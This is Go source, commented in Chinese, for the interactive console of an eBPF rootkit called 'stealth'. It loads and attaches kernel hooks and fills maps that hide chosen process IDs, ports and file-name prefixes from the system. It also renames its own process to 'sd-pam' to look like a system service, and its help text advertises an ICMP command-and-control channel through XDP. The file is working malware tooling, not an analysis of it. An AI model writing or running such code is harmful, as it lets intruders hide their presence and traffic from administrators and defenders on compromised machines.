// stealth - eBPF 隐身程序交互式控制台
//
// 用法：sudo ./stealth [stealth.bpf.o 路径]
//
// 交互命令：
//
//	load              加载并挂载 eBPF 程序
//	unload            卸载所有 hook（销毁 bpf_link）
//	enable / disable  开关全局隐藏功能（不卸载 hook）
//	hide pid <PID>    隐藏指定进程
//	hide port <PORT>  隐藏指定端口
//	hide file <PREFIX> 隐藏指定文件名前缀
//	show              显示当前隐藏规则
//	status            显示加载状态
//	help              显示帮助
//	exit / quit       退出
package main

import (
	"bufio"
	"fmt"
	"math"
	"os"
	"strconv"
	"strings"
	"unsafe"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
	"golang.org/x/sys/unix"
)

const bpfObjDefault = "stealth.bpf.o"

// hashPrefix 与 stealth.bpf.h 中的 hash_prefix 逻辑一致
// 取前 3 个字节做简单哈希，作为 hidden_prefixes map 的 key
func hashPrefix(s string) uint32 {
	var h uint32
	for i := 0; i < 3 && i < len(s) && s[i] != 0; i++ {
		h = h*31 + uint32(s[i])
	}
	return h
}

// stealth 封装所有运行时状态
type stealth struct {
	obj     *ebpf.Collection // 已加载的 eBPF 对象（包含所有 map 和程序）
	links   []link.Link      // 已挂载的 hook，退出时逐一 Close() 卸载
	bpfPath string           // .bpf.o 文件路径
	iface   string           // XDP 挂载网卡名（可选，不指定则跳过 XDP hook）

	// 本地缓存，用于 show 命令展示
	pids     []uint32
	ports    []uint16
	prefixes []string
}

func newStealth(path string) *stealth {
	return &stealth{bpfPath: path}
}

func (s *stealth) loaded() bool { return s.obj != nil }

// load 打开并加载 .bpf.o，挂载所有 hook，写入初始开关
// loadWithIface 可以指定 XDP 挂载网卡
func (s *stealth) load() error {
	if s.loaded() {
		return fmt.Errorf("已加载，请先 unload")
	}

	// LoadCollectionSpec 解析 ELF，不加载到内核，保留 SEC 名称用于后续挂载
	spec, err := ebpf.LoadCollectionSpec(s.bpfPath)
	if err != nil {
		return fmt.Errorf("打开 %s 失败: %w", s.bpfPath, err)
	}

	// 记录每个程序名 → SEC 名称的映射，NewCollection 之前先收集
	secNames := make(map[string]string, len(spec.Programs))
	for name, ps := range spec.Programs {
		secNames[name] = ps.SectionName
	}

	// NewCollection 将所有 map 和程序加载进内核
	col, err := ebpf.NewCollection(spec)
	if err != nil {
		return fmt.Errorf("加载 eBPF 失败: %w", err)
	}
	s.obj = col

	// 按 SEC 名称挂载每个 hook
	for name, prog := range col.Programs {
		sec, ok := secNames[name]
		if !ok {
			continue
		}
		lk, err := attachBySpec(prog, sec, s.iface)
		if err != nil {
			fmt.Printf("  [warn] 挂载 %s (%s) 失败: %v\n", name, sec, err)
			continue
		}
		s.links = append(s.links, lk)
		fmt.Printf("  [ok] 挂载 %s (%s)\n", name, sec)
	}

	// 开启全局隐藏开关（stealth_state map，key=0, value=1）
	if err := s.setState(1); err != nil {
		fmt.Printf("  [warn] 开启隐藏开关失败: %v\n", err)
	}

	return nil
}

// unload 销毁所有 link（内核自动卸载 hook），关闭 collection
func (s *stealth) unload() error {
	if !s.loaded() {
		return fmt.Errorf("尚未加载")
	}
	for _, lk := range s.links {
		lk.Close()
	}
	s.links = nil
	s.obj.Close()
	s.obj = nil
	fmt.Println("已卸载所有 hook")
	return nil
}

func (s *stealth) setState(v uint8) error {
	m, ok := s.obj.Maps["stealth_state"]
	if !ok {
		return fmt.Errorf("map stealth_state 不存在")
	}
	var k uint32 = 0
	return m.Update(k, v, ebpf.UpdateAny)
}

func (s *stealth) enable() error {
	if !s.loaded() {
		return fmt.Errorf("尚未加载")
	}
	return s.setState(1)
}

func (s *stealth) disable() error {
	if !s.loaded() {
		return fmt.Errorf("尚未加载")
	}
	return s.setState(0)
}

func (s *stealth) hidePID(pid uint32) error {
	if !s.loaded() {
		return fmt.Errorf("尚未加载")
	}
	m, ok := s.obj.Maps["hidden_pids"]
	if !ok {
		return fmt.Errorf("map hidden_pids 不存在")
	}
	var v uint8 = 1
	if err := m.Update(pid, &v, ebpf.UpdateAny); err != nil {
		return fmt.Errorf("update hidden_pids key=%d: %w", pid, err)
	}
	s.pids = append(s.pids, pid)
	return nil
}

func (s *stealth) hidePort(port uint16) error {
	if !s.loaded() {
		return fmt.Errorf("尚未加载")
	}
	m, ok := s.obj.Maps["hidden_ports"]
	if !ok {
		return fmt.Errorf("map hidden_ports 不存在")
	}
	var v uint8 = 1
	if err := m.Update(port, &v, ebpf.UpdateAny); err != nil {
		return fmt.Errorf("update hidden_ports key=%d: %w", port, err)
	}
	s.ports = append(s.ports, port)
	return nil
}

func (s *stealth) hideFile(prefix string) error {
	if !s.loaded() {
		return fmt.Errorf("尚未加载")
	}
	m, ok := s.obj.Maps["hidden_prefixes"]
	if !ok {
		return fmt.Errorf("map hidden_prefixes 不存在")
	}
	h := hashPrefix(prefix)
	var v uint8 = 1
	if err := m.Update(h, &v, ebpf.UpdateAny); err != nil {
		return err
	}
	s.prefixes = append(s.prefixes, prefix)
	return nil
}

func (s *stealth) show() {
	fmt.Printf("PIDs    : %v\n", s.pids)
	fmt.Printf("Ports   : %v\n", s.ports)
	fmt.Printf("Prefixes: %v\n", s.prefixes)
}

func (s *stealth) status() {
	if !s.loaded() {
		fmt.Println("状态: 未加载")
		return
	}
	fmt.Printf("状态: 已加载，活跃 hook 数: %d\n", len(s.links))

	m, ok := s.obj.Maps["stealth_state"]
	if !ok {
		return
	}
	var k uint32 = 0
	var v uint8
	if err := m.Lookup(k, &v); err == nil {
		if v == 1 {
			fmt.Println("隐藏功能: 开启")
		} else {
			fmt.Println("隐藏功能: 关闭")
		}
	}
}

// disguise 伪装进程名（Linux only）
func disguise() {
	// 修改 /proc/self/comm（ps 显示的 COMM 列）
	fake := []byte("sd-pam\x00")
	unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&fake[0])), 0, 0, 0) //nolint
}

func printHelp() {
	fmt.Print(`
命令列表:
  load [path] [--iface <网卡>]  加载并挂载 eBPF 程序，--iface 指定 XDP 挂载网卡（启用 ICMP C2）
  unload                卸载所有 hook
  enable                开启隐藏功能
  disable               关闭隐藏功能（保留 hook，不卸载）
  hide pid <PID>        隐藏指定进程
  hide port <PORT>      隐藏指定端口
  hide file <PREFIX>    隐藏指定文件名前缀
  show                  显示当前隐藏规则
  status                显示加载状态
  help                  显示本帮助
  exit / quit           退出

`)
}

func main() {
	bpfPath := bpfObjDefault
	if len(os.Args) > 1 {
		bpfPath = os.Args[1]
	}

	disguise()

	s := newStealth(bpfPath)
	defer func() {
		if s.loaded() {
			s.unload() //nolint
		}
	}()

	fmt.Printf("stealth console (bpf: %s)\n", bpfPath)
	fmt.Println(`输入 "help" 查看命令列表，需要 root 权限`)
	fmt.Println()

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("stealth> ")
		if !scanner.Scan() {
			break
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		parts := strings.Fields(line)
		cmd := parts[0]

		var err error
		switch cmd {
		case "load":
			// 用法: load [path] [--iface <网卡>]
			for i := 1; i < len(parts); i++ {
				if parts[i] == "--iface" && i+1 < len(parts) {
					s.iface = parts[i+1]
					i++
				} else {
					s.bpfPath = parts[i]
				}
			}
			err = s.load()
			if err == nil {
				fmt.Println("加载成功")
			}
		case "unload":
			err = s.unload()
		case "enable":
			err = s.enable()
			if err == nil {
				fmt.Println("隐藏功能已开启")
			}
		case "disable":
			err = s.disable()
			if err == nil {
				fmt.Println("隐藏功能已关闭")
			}
		case "hide":
			if len(parts) < 3 {
				fmt.Println("用法: hide pid <PID> | hide port <PORT> | hide file <PREFIX>")
				continue
			}
			switch parts[1] {
			case "pid":
				v, e := strconv.ParseUint(parts[2], 10, 32)
				if e != nil {
					fmt.Println("无效 PID")
					continue
				}
				err = s.hidePID(uint32(v))
				if err == nil {
					fmt.Printf("已隐藏 PID %d\n", v)
				}
			case "port":
				v, e := strconv.ParseUint(parts[2], 10, 16)
				if e != nil || v > math.MaxUint16 {
					fmt.Println("无效端口")
					continue
				}
				err = s.hidePort(uint16(v))
				if err == nil {
					fmt.Printf("已隐藏端口 %d\n", v)
				}
			case "file":
				err = s.hideFile(parts[2])
				if err == nil {
					fmt.Printf("已隐藏前缀 %q\n", parts[2])
				}
			default:
				fmt.Println("未知子命令，用法: hide pid|port|file <值>")
			}
		case "show":
			s.show()
		case "status":
			s.status()
		case "help":
			printHelp()
		case "exit", "quit":
			fmt.Println("退出")
			return
		default:
			fmt.Printf("未知命令 %q，输入 help 查看帮助\n", cmd)
		}

		if err != nil {
			fmt.Printf("错误: %v\n", err)
		}
	}
}
